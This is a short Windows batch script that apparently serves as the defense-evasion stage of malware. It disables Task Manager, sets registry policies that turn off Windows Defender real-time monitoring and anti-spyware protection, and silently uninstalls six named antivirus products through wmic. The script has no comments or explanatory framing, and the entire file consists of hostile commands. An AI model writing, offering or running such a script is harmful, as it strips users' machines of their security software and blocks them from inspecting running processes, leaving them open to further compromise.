@echo off
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

wmic product where "name like '%%Avast%%Free%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%AVG%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%McAfee%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%Norton%%Security%%'" call uninstall /nointeractive
wmic product where "name like '%%Kaspersky%%Antivirus%%'" call uninstall /nointeractive
wmic product where "name like '%%Bitdefender%%'" call uninstall /nointeractive
